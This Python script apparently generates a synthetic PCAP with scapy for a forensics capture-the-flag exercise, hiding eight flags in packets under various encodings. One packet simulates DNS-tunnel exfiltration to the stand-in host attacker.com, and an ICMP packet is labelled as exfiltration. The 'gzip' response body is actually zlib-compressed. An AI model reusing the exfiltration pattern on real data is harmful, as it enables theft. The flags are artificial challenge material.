import base64
import codecs
import zlib
import os
from scapy.all import wrpcap, Ether, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR


def generate_synthetic_pcap(filepath: str):
    """
    Generates a synthetic PCAP capture containing:
    1. Raw TCP packet with plaintext flag: flag{raw_plaintext_packet}
    2. Raw UDP packet with Base64 flag: picoCTF{base64_udp_secret}
    3. DNS query with Hex-encoded flag: THM{hex_dns_tunnel}
    4. HTTP stream with URL-encoded flag: H4G{url_encoded_param}
    5. HTTP stream with Gzip compressed content: flag{gzip_compressed_http_body}
    6. HTTP response containing a PNG image with appended stego trailer: HTB{png_stego_after_iend}
    7. ICMP echo request with ROT13-encoded flag: HTB{rot13_icmp_secret}
    8. TCP stream with reversed flag: HTB{reversed_flag_in_stream}
    """
    packets = []

    # 1. Raw TCP packet with Plaintext flag
    pkt1 = Ether() / IP(src="192.168.1.10", dst="192.168.1.50") / TCP(sport=44321, dport=8080, flags="PA") / Raw(
        load=b"AUTH_REQUEST user=admin&token=flag{raw_plaintext_packet}\r\n"
    )
    packets.append(pkt1)

    # 2. Raw UDP packet with Base64 flag
    b64_flag = base64.b64encode(b"picoCTF{base64_udp_secret}").decode()
    pkt2 = Ether() / IP(src="192.168.1.20", dst="192.168.1.88") / UDP(sport=5000, dport=9000) / Raw(
        load=f"DATA_LOG: {b64_flag} checksum=valid\n".encode()
    )
    packets.append(pkt2)

    # 3. DNS query exfiltrating Hex flag
    # THM{hex_dns_tunnel} -> 54484d7b6865785f646e735f74756e6e656c7d
    hex_flag = b"THM{hex_dns_tunnel}".hex()
    pkt3 = Ether() / IP(src="192.168.1.30", dst="8.8.8.8") / UDP(sport=53210, dport=53) / DNS(
        rd=1, qd=DNSQR(qname=f"{hex_flag}.attacker.com")
    )
    packets.append(pkt3)

    # 4. HTTP stream with URL-encoded flag
    # H4G{url_encoded_param} -> H4G%7Burl_encoded_param%7D
    http_req = (
        b"GET /api/v1/user?search=H4G%7Burl_encoded_param%7D HTTP/1.1\r\n"
        b"Host: ctf.internal\r\n"
        b"User-Agent: Mozilla/5.0\r\n\r\n"
    )
    pkt4 = Ether() / IP(src="10.0.0.5", dst="10.0.0.1") / TCP(sport=51234, dport=80, flags="PA") / Raw(load=http_req)
    packets.append(pkt4)

    # 5. HTTP response with Gzip compressed content containing a flag
    raw_html = b"<html><body><h1>Secret Portal</h1><p>The flag is flag{gzip_compressed_http_body}</p></body></html>"
    gz_body = zlib.compress(raw_html, 9)
    http_resp_gz = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n"
        b"Content-Encoding: gzip\r\n"
        + f"Content-Length: {len(gz_body)}\r\n\r\n".encode()
        + gz_body
    )
    pkt5 = Ether() / IP(src="10.0.0.1", dst="10.0.0.5") / TCP(sport=80, dport=51234, flags="PA") / Raw(load=http_resp_gz)
    packets.append(pkt5)

    # 6. Valid minimal 1x1 PNG image with appended Stego data after IEND
    # 1x1 PNG byte sequence:
    png_header = b"\x89PNG\r\n\x1a\n"
    # IHDR chunk: 1x1 RGB 8bit
    ihdr = b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde"
    # IDAT chunk
    idat = b"\x00\x00\x00\x0cIDATx\x9cc\xf8\xcf\xc0\x00\x00\x03\x01\x01\x00\x18\xdd\x8d\xb0"
    # IEND chunk: length 0, type IEND, crc AE426082
    iend = b"\x00\x00\x00\x00IEND\xae\x42\x60\x82"
    # Appended secret after IEND
    appended_stego = b"\r\n--- HIDDEN FORENSIC TRAILER ---\r\nFLAG=HTB{png_stego_after_iend}\r\n"
    complete_stego_png = png_header + ihdr + idat + iend + appended_stego

    http_img_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: image/png\r\n"
        b"Content-Disposition: attachment; filename=\"secret_cat.png\"\r\n"
        + f"Content-Length: {len(complete_stego_png)}\r\n\r\n".encode()
        + complete_stego_png
    )
    pkt6 = Ether() / IP(src="10.0.0.1", dst="10.0.0.5") / TCP(sport=80, dport=51235, flags="PA") / Raw(load=http_img_resp)
    packets.append(pkt6)

    # 7. ICMP echo request with ROT13-encoded flag: UGO{ebg13_vpzc_frperg} -> HTB{rot13_icmp_secret}
    rot13_flag = codecs.encode("HTB{rot13_icmp_secret}", "rot_13").encode()
    pkt7 = Ether() / IP(src="172.16.0.4", dst="172.16.0.1") / ICMP(type=8, code=0) / Raw(
        load=b"PING_EXFIL: " + rot13_flag
    )
    packets.append(pkt7)

    # 8. TCP stream with reversed flag: }maerts_ni_galf_desrever{BTH
    reversed_flag = b"}maerts_ni_galf_desrever{BTH"
    pkt8 = Ether() / IP(src="172.16.0.9", dst="172.16.0.99") / TCP(sport=33445, dport=2222, flags="PA") / Raw(
        load=b"BUFFER_DUMP: " + reversed_flag + b" [END]"
    )
    packets.append(pkt8)

    wrpcap(filepath, packets)
    return len(packets)


if __name__ == "__main__":
    out = "test_capture.pcap"
    cnt = generate_synthetic_pcap(out)
    print(f"Generated {out} with {cnt} packets.")

